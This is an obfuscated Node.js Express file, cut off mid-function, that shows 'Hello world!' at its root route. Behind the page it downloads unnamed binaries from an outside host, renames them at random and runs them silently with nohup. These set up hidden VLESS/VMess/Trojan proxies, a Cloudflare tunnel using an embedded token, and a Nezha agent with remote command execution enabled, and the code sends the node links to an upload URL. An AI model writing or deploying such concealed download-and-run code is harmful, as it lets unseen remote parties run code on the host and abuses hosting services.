const _0x5085e4=_0x3b52;(function(_0x3844b7,_0xb8a68b){const _0x2b04ec={_0x2809d0:0x8c,_0x231944:0x133,_0x55d639:0x13e,_0x4e1fc6:0xf5},_0x34af94=_0x3b52,_0x122c04=_0x3844b7();while(!![]){try{const _0x698be6=parseInt(_0x34af94(_0x2b04ec._0x2809d0))/0x1+-parseInt(_0x34af94(_0x2b04ec._0x231944))/0x2+parseInt(_0x34af94(_0x2b04ec._0x55d639))/0x3+-parseInt(_0x34af94(0x93))/0x4+-parseInt(_0x34af94(0x138))/0x5*(parseInt(_0x34af94(0x10b))/0x6)+parseInt(_0x34af94(0xcb))/0x7+-parseInt(_0x34af94(_0x2b04ec._0x4e1fc6))/0x8;if(_0x698be6===_0xb8a68b)break;else _0x122c04['push'](_0x122c04['shift']());}catch(_0x3c4ff6){_0x122c04['push'](_0x122c04['shift']());}}}(_0x5026,0x261c5));const express=require(_0x5085e4(0xee)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5085e4(0x139)),{promisify}=require(_0x5085e4(0x115)),exec=promisify(require(_0x5085e4(0xba))['exec']),{execSync}=require(_0x5085e4(0xba)),UPLOAD_URL=process[_0x5085e4(0xab)][_0x5085e4(0x13f)]||'',PROJECT_URL=process['env'][_0x5085e4(0xcc)]||'',AUTO_ACCESS=process[_0x5085e4(0xab)][_0x5085e4(0xf0)]||![],FILE_PATH=process['env'][_0x5085e4(0xd6)]||_0x5085e4(0xc8),SUB_PATH=process['env'][_0x5085e4(0xe1)]||_0x5085e4(0x110),PORT=process[_0x5085e4(0xab)][_0x5085e4(0xb3)]||process[_0x5085e4(0xab)][_0x5085e4(0x136)]||0xbb8,UUID=process[_0x5085e4(0xab)][_0x5085e4(0xa0)]||_0x5085e4(0x123),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5085e4(0xab)][_0x5085e4(0xd4)]||'',ARGO_DOMAIN=process['env'][_0x5085e4(0xf6)]||_0x5085e4(0xf9),ARGO_AUTH=process[_0x5085e4(0xab)][_0x5085e4(0x90)]||_0x5085e4(0xd1),ARGO_PORT=process[_0x5085e4(0xab)][_0x5085e4(0x13b)]||0x1f41,CFIP=process[_0x5085e4(0xab)][_0x5085e4(0xd3)]||_0x5085e4(0x83),CFPORT=process[_0x5085e4(0xab)][_0x5085e4(0x10f)]||0x1bb,NAME=process['env'][_0x5085e4(0xda)]||_0x5085e4(0xe8);!fs[_0x5085e4(0x103)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x5085e4(0x10a)](FILE_PATH+_0x5085e4(0xe0))):console['log'](FILE_PATH+_0x5085e4(0xa2));function generateRandomName(){const _0x4fc18f={_0x2fe0c3:0x118,_0x29cc75:0x97,_0xd700a:0x8f,_0x73042b:0xb2},_0x5291dd=_0x5085e4,_0x181c69='abcdefghijklmnopqrstuvwxyz';let _0x53ef62='';for(let _0x3d4a46=0x0;_0x3d4a46<0x6;_0x3d4a46++){_0x53ef62+=_0x181c69[_0x5291dd(_0x4fc18f._0x2fe0c3)](Math[_0x5291dd(_0x4fc18f._0x29cc75)](Math[_0x5291dd(_0x4fc18f._0xd700a)]()*_0x181c69[_0x5291dd(_0x4fc18f._0x73042b)]));}return _0x53ef62;}function _0x5026(){const _0x1f3b90=['Download\x20','NAME','php\x20running\x20error:\x20','unlinkSync','Content-Type','unlink','/sub.txt\x20saved\x20successfully','\x20is\x20created','SUB_PATH','listen','\x0aclient_secret:\x20','send','\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','arch','Railway2','Error\x20reading\x20boot.log:','country_code','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20>\x20nul\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','express','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','AUTO_ACCESS','\x20>/dev/null\x202>&1','pipe','config.yaml','&path=%2Ftrojan-argo%3Fed%3D2560#','1563216HobiII','ARGO_DOMAIN','/dev/null','basename','railway2.xoxoxo.ggff.net','/vmess-argo','/vless-argo','Unhandled\x20error\x20in\x20startserver:','&fp=firefox&type=ws&host=','tunnel.json','match','https://arm64.ssss.nyc.mn/bot','application/json','/trojan-argo','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','del\x20/f\x20/q\x20','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/v1','set','\x20successfully','log','6tnbtyI','split','2053','writeFileSync','CFPORT','sub','platform','tunnel.yml','stream','\x22\x20>\x20/dev/null\x202>&1','util','from','status','charAt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','2083','Error\x20executing\x20command:\x20','block','http','arm64','post','Error\x20in\x20startserver:','aarch64','TunnelSecret','712e1f6b-e104-441b-bef4-134665a35fa9','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','utf-8','ArgoDomain:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','unshift','map','error','trojan','\x20failed:\x20','2087','\x0a\x20\x20\x20\x20','&path=%2Fvless-argo%3Fed%3D2560#','push','toString','firefox','12844YxkgPT','Subscription\x20uploaded\x20successfully','none','PORT','finish','1184810GLonsY','path','127.0.0.1','ARGO_PORT','clear','ARGO_DOMAIN:','718299dEllNd','UPLOAD_URL','substring','http\x20server\x20is\x20running\x20on\x20port:','catch','quic','message','cf.877774.xyz','success','/tunnel.yml\x20run','App\x20is\x20running','nohup\x20','tls','Hello\x20world!','test','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','310640TVFhWP','config.json','Error\x20downloading\x20files:','random','ARGO_AUTH','list.txt','chmod','607988HemMGG','includes','https://amd64.ssss.nyc.mn/agent','text/plain;\x20charset=utf-8','floor','win32','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','xtls-rprx-vision','Add\x20automatic\x20access\x20task\x20faild:\x20','direct','Nodes\x20uploaded\x20successfully','filter','https://amd64.ssss.nyc.mn/web','UUID','statSync','\x20already\x20exists','\x20-c\x20\x22','join','fileName','tcp','Empowerment\x20success\x20for\x20','response','Empowerment\x20failed\x20for\x20','amd','env','readFileSync','data','boot.log','web\x20running\x20error:\x20','countryCode','automatic\x20access\x20task\x20added\x20successfully','length','SERVER_PORT','blackhole','forEach','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','https://oooo.serv00.net/add-url','https://ipapi.co/json/','\x20is\x20running','child_process','8443','--tls','/api/add-nodes','true','vless','get','org','mkdirSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','rm\x20-rf\x20','/vmess-argo?ed=2560','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x0atrojan://','./tmp','then','taskkill\x20/f\x20/im\x20','1377677UOESim','PROJECT_URL','2096','stringify','?encryption=none&security=tls&sni=','Unknown','eyJhIjoiMjY0ODlhOGFkYmYyOWM0NDVkN2JhNmE5M2U5ZmIxODUiLCJ0IjoiZmQ1YWM0NGUtM2IwYi00MjNkLWIzMWYtMjQ4OTMyMWQwMTQyIiwicyI6Ik1tUTJZakZpTXpBdFpqazRNaTAwTURVNUxXSXdZamt0WTJKbVpETmlZemMxT1RBeCJ9','arm','CFIP','NEZHA_KEY','\x0a\x20\x20tunnel:\x20','FILE_PATH','base64','all'];_0x5026=function(){return _0x1f3b90;};return _0x5026();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5085e4(0xa4)](FILE_PATH,npmName),phpPath=path[_0x5085e4(0xa4)](FILE_PATH,phpName),webPath=path[_0x5085e4(0xa4)](FILE_PATH,webName),botPath=path[_0x5085e4(0xa4)](FILE_PATH,botName),subPath=path[_0x5085e4(0xa4)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x5085e4(0x91)),bootLogPath=path[_0x5085e4(0xa4)](FILE_PATH,'boot.log'),configPath=path[_0x5085e4(0xa4)](FILE_PATH,'config.json');function deleteNodes(){const _0x85f73f={_0x45a1a6:0x125,_0xa6e1a0:0x116,_0x51a3f1:0x131,_0x31ef54:0x10c,_0x266f42:0x142},_0x1ebf61=_0x5085e4;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1aee83;try{_0x1aee83=fs[_0x1ebf61(0xac)](subPath,_0x1ebf61(_0x85f73f._0x45a1a6));}catch{return null;}const _0x1a2a63=Buffer[_0x1ebf61(_0x85f73f._0xa6e1a0)](_0x1aee83,_0x1ebf61(0xd7))[_0x1ebf61(_0x85f73f._0x51a3f1)]('utf-8'),_0x14540a=_0x1a2a63[_0x1ebf61(_0x85f73f._0x31ef54)]('\x0a')[_0x1ebf61(0x9e)](_0x454511=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ebf61(0x8a)](_0x454511));if(_0x14540a[_0x1ebf61(0xb2)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x14540a}),{'headers':{'Content-Type':_0x1ebf61(0x101)}})[_0x1ebf61(_0x85f73f._0x266f42)](_0x592dc9=>{return null;}),null;}catch(_0x397c84){return null;}}function cleanupOldFiles(){const _0x265aae={_0x18daea:0xb5},_0x3191c3={_0x9278cb:0xa1},_0x271a7b=_0x5085e4;try{const _0x59d3ef=fs['readdirSync'](FILE_PATH);_0x59d3ef[_0x271a7b(_0x265aae._0x18daea)](_0x20c7a0=>{const _0x2434e7=_0x271a7b,_0xf25afd=path['join'](FILE_PATH,_0x20c7a0);try{const _0x47dc1e=fs[_0x2434e7(_0x3191c3._0x9278cb)](_0xf25afd);_0x47dc1e['isFile']()&&fs['unlinkSync'](_0xf25afd);}catch(_0x306164){}});}catch(_0x3faab4){}}app[_0x5085e4(0xc0)]('/',function(_0x3c28b0,_0x3c7416){const _0x20ab8e={_0x8dec6b:0x89},_0x39ea7e=_0x5085e4;_0x3c7416[_0x39ea7e(0xe4)](_0x39ea7e(_0x20ab8e._0x8dec6b));});async function generateConfig(){const _0x119c96={_0x1ee341:0xf7,_0x27d436:0xa6,_0x1903df:0xbf,_0x4679be:0xa6,_0x463b18:0x135,_0x4c72bc:0xbf,_0x381063:0xfb,_0x569294:0xfa,_0x5d3c10:0x102,_0x14bd18:0x11d,_0x9bf9bd:0x9c,_0x4bd06a:0xb4,_0x19424d:0x8d},_0x2960ec=_0x5085e4,_0x55526b={'log':{'access':_0x2960ec(0xf7),'error':_0x2960ec(_0x119c96._0x1ee341),'loglevel':_0x2960ec(0x135)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2960ec(0x9a)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2960ec(0xfb),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x2960ec(0x102),'dest':0xbbc}]},'streamSettings':{'network':_0x2960ec(_0x119c96._0x27d436)}},{'port':0xbb9,'listen':_0x2960ec(0x13a),'protocol':_0x2960ec(_0x119c96._0x1903df),'settings':{'clients':[{'id':UUID}],'decryption':_0x2960ec(0x135)},'streamSettings':{'network':_0x2960ec(_0x119c96._0x4679be),'security':_0x2960ec(_0x119c96._0x463b18)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2960ec(_0x119c96._0x4c72bc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2960ec(_0x119c96._0x463b18),'wsSettings':{'path':_0x2960ec(_0x119c96._0x381063)}},'sniffing':{'enabled':!![],'destOverride':[_0x2960ec(0x11d),_0x2960ec(0x88),_0x2960ec(0x143)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2960ec(_0x119c96._0x569294)}},'sniffing':{'enabled':!![],'destOverride':[_0x2960ec(0x11d),'tls',_0x2960ec(0x143)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2960ec(0x12b),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2960ec(_0x119c96._0x463b18),'wsSettings':{'path':_0x2960ec(_0x119c96._0x5d3c10)}},'sniffing':{'enabled':!![],'destOverride':[_0x2960ec(_0x119c96._0x14bd18),_0x2960ec(0x88),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x2960ec(_0x119c96._0x9bf9bd)},{'protocol':_0x2960ec(_0x119c96._0x4bd06a),'tag':_0x2960ec(0x11c)}]};fs[_0x2960ec(0x10e)](path['join'](FILE_PATH,_0x2960ec(_0x119c96._0x19424d)),JSON['stringify'](_0x55526b,null,0x2));}function getSystemArchitecture(){const _0xff4961={_0x294779:0xe7,_0x2b7492:0x121,_0x1bad69:0xd2,_0x428e4b:0xaa},_0x2e5e8e=_0x5085e4,_0x52c176=os[_0x2e5e8e(_0xff4961._0x294779)]();return _0x52c176==='arm'||_0x52c176===_0x2e5e8e(0x11e)||_0x52c176===_0x2e5e8e(_0xff4961._0x2b7492)?_0x2e5e8e(_0xff4961._0x1bad69):_0x2e5e8e(_0xff4961._0x428e4b);}function _0x3b52(_0x3fe9ab,_0xbf6a3c){const _0x502673=_0x5026();return _0x3b52=function(_0x3b529a,_0x293b93){_0x3b529a=_0x3b529a-0x82;let _0x444bb7=_0x502673[_0x3b529a];return _0x444bb7;},_0x3b52(_0x3fe9ab,_0xbf6a3c);}function downloadFile(_0x34cd9c,_0x317ec5,_0x33f9a1){const _0xae1b08={_0x47799b:0x103,_0x4f76fe:0xc2,_0x27ab53:0xc0,_0x4c6c76:0xc9,_0x31d4d1:0x142},_0x4b7945={_0xfd90c4:0xd9,_0x5b6b63:0xf8},_0x255846={_0x12b148:0xad,_0x48108a:0xf2,_0x3d4f60:0x137,_0x7d5e39:0x12a},_0x473e48=_0x5085e4,_0xa8927=_0x34cd9c;!fs[_0x473e48(_0xae1b08._0x47799b)](FILE_PATH)&&fs[_0x473e48(_0xae1b08._0x4f76fe)](FILE_PATH,{'recursive':!![]});const _0x3ff5ee=fs['createWriteStream'](_0xa8927);axios({'method':_0x473e48(_0xae1b08._0x27ab53),'url':_0x317ec5,'responseType':_0x473e48(0x113)})[_0x473e48(_0xae1b08._0x4c6c76)](_0x49032f=>{const _0x5b41ba={_0x243e24:0xf8,_0x2ee1b5:0x82},_0x2bcca0=_0x473e48;_0x49032f[_0x2bcca0(_0x255846._0x12b148)][_0x2bcca0(_0x255846._0x48108a)](_0x3ff5ee),_0x3ff5ee['on'](_0x2bcca0(_0x255846._0x3d4f60),()=>{const _0x4e5f2f=_0x2bcca0;_0x3ff5ee['close'](),console[_0x4e5f2f(0x10a)](_0x4e5f2f(0xd9)+path['basename'](_0xa8927)+_0x4e5f2f(0x109)),_0x33f9a1(null,_0xa8927);}),_0x3ff5ee['on'](_0x2bcca0(_0x255846._0x7d5e39),_0x34e0eb=>{const _0x2e83a4=_0x2bcca0;fs[_0x2e83a4(0xde)](_0xa8927,()=>{});const _0x4bfd43='Download\x20'+path[_0x2e83a4(_0x5b41ba._0x243e24)](_0xa8927)+_0x2e83a4(0x12c)+_0x34e0eb[_0x2e83a4(_0x5b41ba._0x2ee1b5)];console[_0x2e83a4(0x12a)](_0x4bfd43),_0x33f9a1(_0x4bfd43);});})[_0x473e48(_0xae1b08._0x31d4d1)](_0x537290=>{const _0x3af379=_0x473e48,_0x214061=_0x3af379(_0x4b7945._0xfd90c4)+path[_0x3af379(_0x4b7945._0x5b6b63)](_0xa8927)+_0x3af379(0x12c)+_0x537290[_0x3af379(0x82)];console['error'](_0x214061),_0x33f9a1(_0x214061);});}async function downloadFilesAndRun(){const _0x4b75e7={_0x37fe49:0xb2,_0x1327b6:0x129,_0x4250f5:0x12a,_0x44141e:0x8e,_0x1cab85:0x94,_0x255901:0x10c,_0x4ca451:0x12d,_0x1274e9:0x11a,_0x2cc80d:0xbe,_0x3d7d52:0xc6,_0x1d9756:0xa4,_0x3235eb:0x12a,_0x21ef5f:0xdb,_0x49fb35:0xcd,_0x305484:0x10d,_0x30dcd5:0x10a,_0x5a9556:0xb9,_0x5eabbf:0xaf,_0x315a07:0x99,_0x18d9b0:0x104,_0x153dda:0x85,_0x43aa8c:0x124,_0x1b0797:0xe5,_0x422dd6:0x10a,_0x466f6a:0xb9,_0x59acb6:0x12a},_0x179acc=_0x5085e4,_0x30bfb7=getSystemArchitecture(),_0x1cc365=getFilesForArchitecture(_0x30bfb7);if(_0x1cc365[_0x179acc(_0x4b75e7._0x37fe49)]===0x0){console[_0x179acc(0x10a)](_0x179acc(0xb6));return;}const _0x482606=_0x1cc365[_0x179acc(_0x4b75e7._0x1327b6)](_0x292e60=>{return new Promise((_0x171340,_0x26e9f1)=>{const _0x162dcd=_0x3b52;downloadFile(_0x292e60[_0x162dcd(0xa5)],_0x292e60['fileUrl'],(_0x2c2814,_0x3f6fd4)=>{_0x2c2814?_0x26e9f1(_0x2c2814):_0x171340(_0x3f6fd4);});});});try{await Promise[_0x179acc(0xd8)](_0x482606);}catch(_0x2dd6f7){console[_0x179acc(_0x4b75e7._0x4250f5)](_0x179acc(_0x4b75e7._0x44141e),_0x2dd6f7);return;}function _0x3ada16(_0x43316a){const _0x432d34={_0x127349:0xa9},_0x1845d9=_0x179acc,_0x1420b3=0x1fd;_0x43316a[_0x1845d9(0xb5)](_0x3558b8=>{const _0x3601dd=_0x1845d9;fs[_0x3601dd(0x103)](_0x3558b8)&&fs[_0x3601dd(0x92)](_0x3558b8,_0x1420b3,_0x509eff=>{const _0x12a4d6=_0x3601dd;_0x509eff?console['error'](_0x12a4d6(_0x432d34._0x127349)+_0x3558b8+':\x20'+_0x509eff):console['log'](_0x12a4d6(0xa7)+_0x3558b8+':\x20'+_0x1420b3[_0x12a4d6(0x131)](0x8));});});}const _0x3dd3e2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3ada16(_0x3dd3e2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x282db7=NEZHA_SERVER[_0x179acc(_0x4b75e7._0x1cab85)](':')?NEZHA_SERVER[_0x179acc(_0x4b75e7._0x255901)](':')['pop']():'',_0x2cc99a=new Set(['443',_0x179acc(0xbb),_0x179acc(0xcd),_0x179acc(_0x4b75e7._0x4ca451),_0x179acc(_0x4b75e7._0x1274e9),'2053']),_0x340097=_0x2cc99a['has'](_0x282db7)?_0x179acc(_0x4b75e7._0x2cc80d):'false',_0x5ea12b=_0x179acc(0xe3)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x179acc(_0x4b75e7._0x3d7d52)+_0x340097+_0x179acc(0xc3)+UUID;fs['writeFileSync'](path[_0x179acc(_0x4b75e7._0x1d9756)](FILE_PATH,_0x179acc(0xf3)),_0x5ea12b);const _0x59566d=_0x179acc(0x87)+phpPath+_0x179acc(0xa3)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x59566d),console[_0x179acc(0x10a)](phpName+_0x179acc(0xb9)),await new Promise(_0x5ec393=>setTimeout(_0x5ec393,0x3e8));}catch(_0xf13d2){console[_0x179acc(_0x4b75e7._0x3235eb)](_0x179acc(_0x4b75e7._0x21ef5f)+_0xf13d2);}}else{let _0x1a7e4d='';const _0x173a62=['443',_0x179acc(0xbb),_0x179acc(_0x4b75e7._0x49fb35),'2087',_0x179acc(0x11a),_0x179acc(_0x4b75e7._0x305484)];_0x173a62[_0x179acc(0x94)](NEZHA_PORT)&&(_0x1a7e4d=_0x179acc(0xbc));const _0x45f6fd=_0x179acc(0x87)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1a7e4d+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x45f6fd),console[_0x179acc(_0x4b75e7._0x30dcd5)](npmName+_0x179acc(0xb9)),await new Promise(_0x1ee0c0=>setTimeout(_0x1ee0c0,0x3e8));}catch(_0x471e15){console[_0x179acc(0x12a)]('npm\x20running\x20error:\x20'+_0x471e15);}}}else console[_0x179acc(0x10a)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3d5244=_0x179acc(0x87)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3d5244),console[_0x179acc(0x10a)](webName+_0x179acc(_0x4b75e7._0x5a9556)),await new Promise(_0x242a5a=>setTimeout(_0x242a5a,0x3e8));}catch(_0x35ebda){console[_0x179acc(0x12a)](_0x179acc(_0x4b75e7._0x5eabbf)+_0x35ebda);}if(fs[_0x179acc(0x103)](botPath)){let _0x1a373c;if(ARGO_AUTH[_0x179acc(0xff)](/^[A-Z0-9a-z=]{120,250}$/))_0x1a373c=_0x179acc(_0x4b75e7._0x315a07)+ARGO_AUTH;else ARGO_AUTH[_0x179acc(0xff)](/TunnelSecret/)?_0x1a373c=_0x179acc(_0x4b75e7._0x18d9b0)+FILE_PATH+_0x179acc(_0x4b75e7._0x153dda):_0x1a373c=_0x179acc(0xeb)+FILE_PATH+_0x179acc(_0x4b75e7._0x43aa8c)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1a373c+_0x179acc(_0x4b75e7._0x1b0797)),console[_0x179acc(_0x4b75e7._0x422dd6)](botName+_0x179acc(_0x4b75e7._0x466f6a)),await new Promise(_0x3dddb9=>setTimeout(_0x3dddb9,0x7d0));}catch(_0x3d014b){console[_0x179acc(_0x4b75e7._0x59acb6)]('Error\x20executing\x20command:\x20'+_0x3d014b);}}await new Promise(_0x2374bc=>setTimeout(_0x2374bc,0x1388));}function getFilesForArchitecture(_0x51a395){const _0x5c0012={_0x265d5d:0x100,_0xd3b97e:0x9f,_0x2ca6ef:0xd2,_0x49ccc5:0x128,_0x5a679a:0x107},_0x4802e3=_0x5085e4;let _0x4c0892;_0x51a395===_0x4802e3(0xd2)?_0x4c0892=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4802e3(_0x5c0012._0x265d5d)}]:_0x4c0892=[{'fileName':webPath,'fileUrl':_0x4802e3(_0x5c0012._0xd3b97e)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x219b46=_0x51a395===_0x4802e3(_0x5c0012._0x2ca6ef)?'https://arm64.ssss.nyc.mn/agent':_0x4802e3(0x95);_0x4c0892[_0x4802e3(_0x5c0012._0x49ccc5)]({'fileName':npmPath,'fileUrl':_0x219b46});}else{const _0x1bbb2b=_0x51a395===_0x4802e3(0xd2)?_0x4802e3(_0x5c0012._0x5a679a):_0x4802e3(0xe6);_0x4c0892[_0x4802e3(_0x5c0012._0x49ccc5)]({'fileName':phpPath,'fileUrl':_0x1bbb2b});}}return _0x4c0892;}function argoType(){const _0x1ff250={_0x299101:0x10a,_0xdea7b9:0x94,_0x4b1f31:0xd5,_0x42d6c9:0x119,_0x51999e:0xef,_0x20867e:0x112},_0x2e14eb=_0x5085e4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2e14eb(_0x1ff250._0x299101)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2e14eb(_0x1ff250._0xdea7b9)](_0x2e14eb(0x122))){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x38f0cd=_0x2e14eb(_0x1ff250._0x4b1f31)+ARGO_AUTH[_0x2e14eb(0x10c)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2e14eb(0xa4)](FILE_PATH,_0x2e14eb(0xfe))+_0x2e14eb(_0x1ff250._0x42d6c9)+ARGO_DOMAIN+_0x2e14eb(_0x1ff250._0x51999e)+ARGO_PORT+_0x2e14eb(0x8b);fs[_0x2e14eb(0x10e)](path['join'](FILE_PATH,_0x2e14eb(_0x1ff250._0x20867e)),_0x38f0cd);}else console[_0x2e14eb(_0x1ff250._0x299101)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x56bc1f={_0xbba38f:0x10a,_0x24348b:0xac,_0x2d4ccc:0x125,_0x33092a:0x10a,_0x1c1f22:0x126,_0x4bb2fe:0xae,_0x27fa14:0xe5,_0x20eca9:0xb9,_0x1bdc35:0x12a},_0x5d49bf={_0x2f0e69:0xc0,_0x4ced73:0xb8,_0x1771ee:0xad,_0xb31181:0xea,_0xa6797c:0xad,_0x4cb3cf:0xb0,_0x134607:0xc1},_0x14842c={_0xfcb629:0x98,_0x45ce73:0xca,_0x440d5f:0x106,_0x501cff:0x118,_0x1d0674:0x140},_0xa183ab={_0x226069:0x130},_0x46cb61=_0x5085e4;let _0xe776f;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe776f=ARGO_DOMAIN,console[_0x46cb61(_0x56bc1f._0xbba38f)](_0x46cb61(0x13d),_0xe776f),await _0x20795c(_0xe776f);else try{const _0x174834=fs[_0x46cb61(_0x56bc1f._0x24348b)](path[_0x46cb61(0xa4)](FILE_PATH,'boot.log'),_0x46cb61(_0x56bc1f._0x2d4ccc)),_0x297a22=_0x174834['split']('\x0a'),_0x1a5156=[];_0x297a22[_0x46cb61(0xb5)](_0x3d6ad1=>{const _0xb36d6a=_0x46cb61,_0x27b972=_0x3d6ad1[_0xb36d6a(0xff)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x27b972){const _0x2f82bb=_0x27b972[0x1];_0x1a5156[_0xb36d6a(_0xa183ab._0x226069)](_0x2f82bb);}});if(_0x1a5156[_0x46cb61(0xb2)]>0x0)_0xe776f=_0x1a5156[0x0],console[_0x46cb61(_0x56bc1f._0x33092a)](_0x46cb61(_0x56bc1f._0x1c1f22),_0xe776f),await _0x20795c(_0xe776f);else{console[_0x46cb61(0x10a)](_0x46cb61(0xed)),fs[_0x46cb61(0xdc)](path['join'](FILE_PATH,_0x46cb61(_0x56bc1f._0x4bb2fe)));async function _0x205177(){const _0x1479d5=_0x46cb61;try{process['platform']===_0x1479d5(_0x14842c._0xfcb629)?await exec(_0x1479d5(_0x14842c._0x45ce73)+botName+_0x1479d5(_0x14842c._0x440d5f)):await exec('pkill\x20-f\x20\x22['+botName[_0x1479d5(_0x14842c._0x501cff)](0x0)+']'+botName[_0x1479d5(_0x14842c._0x1d0674)](0x1)+_0x1479d5(0x114));}catch(_0x4cb842){}}_0x205177(),await new Promise(_0x77e61f=>setTimeout(_0x77e61f,0xbb8));const _0x5608a5=_0x46cb61(0xeb)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5608a5+_0x46cb61(_0x56bc1f._0x27fa14)),console[_0x46cb61(0x10a)](botName+_0x46cb61(_0x56bc1f._0x20eca9)),await new Promise(_0x56a5bd=>setTimeout(_0x56a5bd,0xbb8)),await extractDomains();}catch(_0x5eaa8e){console[_0x46cb61(0x12a)](_0x46cb61(0x11b)+_0x5eaa8e);}}}catch(_0x2a6b35){console[_0x46cb61(_0x56bc1f._0x1bdc35)](_0x46cb61(0xe9),_0x2a6b35);}async function _0x468c7d(){const _0x45909f=_0x46cb61;try{const _0x4e4702=await axios[_0x45909f(_0x5d49bf._0x2f0e69)](_0x45909f(_0x5d49bf._0x4ced73),{'timeout':0xbb8});if(_0x4e4702['data']&&_0x4e4702[_0x45909f(_0x5d49bf._0x1771ee)]['country_code']&&_0x4e4702[_0x45909f(0xad)][_0x45909f(0xc1)])return _0x4e4702[_0x45909f(_0x5d49bf._0x1771ee)][_0x45909f(_0x5d49bf._0xb31181)]+'_'+_0x4e4702[_0x45909f(0xad)][_0x45909f(0xc1)];}catch(_0x452baf){try{const _0x397de1=await axios[_0x45909f(0xc0)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x397de1['data']&&_0x397de1[_0x45909f(_0x5d49bf._0xa6797c)][_0x45909f(0x117)]===_0x45909f(0x84)&&_0x397de1[_0x45909f(_0x5d49bf._0x1771ee)][_0x45909f(_0x5d49bf._0x4cb3cf)]&&_0x397de1[_0x45909f(0xad)][_0x45909f(_0x5d49bf._0x134607)])return _0x397de1[_0x45909f(0xad)][_0x45909f(0xb0)]+'_'+_0x397de1[_0x45909f(0xad)]['org'];}catch(_0x2f7b3c){}}return _0x45909f(0xd0);}async function _0x20795c(_0x40fb44){const 